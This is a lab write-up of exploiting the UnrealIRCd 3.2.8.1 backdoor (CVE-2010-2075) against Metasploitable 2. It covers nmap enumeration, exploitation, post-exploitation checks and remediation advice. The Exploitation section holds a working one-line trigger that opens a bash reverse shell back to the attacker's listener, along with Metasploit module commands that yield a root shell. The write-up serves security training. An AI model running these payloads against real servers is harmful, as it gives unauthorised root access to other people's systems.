---
title: UnrealIRCd 3.2.8.1 Backdoor
cve: CVE-2010-2075
severity: critical
port: 6667/tcp
service: IRC
target: Metasploitable 2
date: 2026-02-05
description: Exploitation of the backdoor present in UnrealIRCd 3.2.8.1, allowing unauthenticated remote command execution via a specially crafted connection string containing the AB prefix.
---

## Overview

UnrealIRCd 3.2.8.1 contains a backdoor that was quietly slipped into the official source distribution sometime between November 2009 and June 2010. Whoever did it added a check in the server's `DEBUG3_DOLOG_SYSTEM` macro: if a line received from a client begins with the two characters `AB`, the rest of the string is passed directly to `system()` on the server. That's unauthenticated OS command execution, no IRC handshake required, no login needed.

It went unnoticed for about six months before a user on the Unreal forums noticed the source tarball checksum didn't match. The project pulled the backdoored release and issued a clean build, but Metasploitable 2 ships with it intentionally as a training target.

## Environment

Isolated KVM/QEMU lab, no internet routing between VMs.

- **Attacker:** Kali Linux — `192.168.122.50`
- **Target:** Metasploitable 2 — `192.168.122.100`
- **Tools:** nmap, ncat, Metasploit Framework

## Discovery

I ran a full service version scan during initial enumeration:

```bash
nmap -sV -p 6667 192.168.122.100
```

```
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
```

Nmap identifies UnrealIRCd but doesn't always pull the specific version from the banner. Connecting manually gives more detail:

```bash
ncat 192.168.122.100 6667
```

```
:irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
```

Sending a `VERSION` command:

```
VERSION
:irc.Metasploitable.LAN 351 * UnrealIRCd-3.2.8.1. irc.Metasploitable.LAN :FhinIoowz [*=2309]
```

`UnrealIRCd-3.2.8.1` — that's the vulnerable version. There's also an Nmap NSE script that confirms exploitability:

```bash
nmap --script irc-unrealircd-backdoor -p 6667 192.168.122.100
```

```
PORT     STATE SERVICE
6667/tcp open  irc
| irc-unrealircd-backdoor:
|   VULNERABLE:
|   UnrealIRCd Backdoor Command Execution
|     State: VULNERABLE
|     IDs:  CVE:CVE-2010-2075
|     Risk factor: High
|_    References: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075
```

## Exploitation

### Manual (netcat)

The backdoor fires immediately when the server receives a line starting with `AB`. I can use this to connect back to a listener I control.

First, set up a listener on Kali:

```bash
ncat -lvnp 4444
```

Then in a second terminal, trigger the backdoor with a reverse shell payload:

```bash
echo "AB; bash -i >& /dev/tcp/192.168.122.50/4444 0>&1" | ncat 192.168.122.100 6667
```

Back on the listener:

```
Ncat: Connection from 192.168.122.100.
Ncat: Connection from 192.168.122.100:48221.
bash: no job control in this shell
root@metasploitable:/etc/unreal#
```

Root shell. The command runs as whatever user the UnrealIRCd process is owned by — on Metasploitable 2 that's root.

I can also use `nc -e` if the target's netcat supports it, but the `/dev/tcp` redirect is more portable and doesn't require a netcat binary with `-e` support.

### Via Metasploit

Metasploit has a module that handles this cleanly and gives a proper Meterpreter session:

```bash
msfconsole -q
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.122.100
set LHOST 192.168.122.50
run
```

```
[*] Started reverse TCP double handler on 192.168.122.50:4444
[*] Connected to 192.168.122.100:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
[*] Sending backdoor command...
[*] Command shell session 1 opened (192.168.122.50:4444 -> 192.168.122.100:48224)

id
uid=0(root) gid=0(root) groups=0(root)
```

The module sends the `AB` trigger with a reverse shell command and catches the callback automatically.

## Post-Exploitation

With root access I confirmed the UnrealIRCd config and checked what else was running:

```bash
cat /etc/unreal/unrealircd.conf | grep -E "^(listen|oper)" | head
```

```bash
ps aux | grep unrealircd
```

```
root      5083  0.0  0.3  17560  3876 ?  Ss  Feb05  0:00 ./unrealircd
```

The process runs as root with no privilege separation whatsoever, which is part of why this is rated critical.

## Remediation

1. **Replace UnrealIRCd** — Upgrade to 3.2.8.2 or any later release that was built from verified source. The project provides SHA1 checksums — compare against a copy from an independent source, not the same download server.
2. **Run IRC as an unprivileged user** — If an IRC server is genuinely needed, it should run as a dedicated low-privilege user, not root. Sandbox it further with a systemd service unit that restricts filesystem access.
3. **Firewall the IRC port** — Port 6667 should not be reachable from untrusted networks. IRC is typically an internal tool; put it behind a VPN or firewall it to known clients.
4. **Audit third-party software sources** — Downloaded binaries and source tarballs should have their checksums verified against an out-of-band authoritative source before installation.

## References

- [NVD — CVE-2010-2075](https://nvd.nist.gov/vuln/detail/CVE-2010-2075)
- [UnrealIRCd security notice, June 2010](https://www.unrealircd.org/txt/unrealsecadvisory20100612.txt)
- [Metasploit module: exploit/unix/irc/unreal_ircd_3281_backdoor](https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/)
- [Nmap NSE: irc-unrealircd-backdoor](https://nmap.org/nsedoc/scripts/irc-unrealircd-backdoor.html)
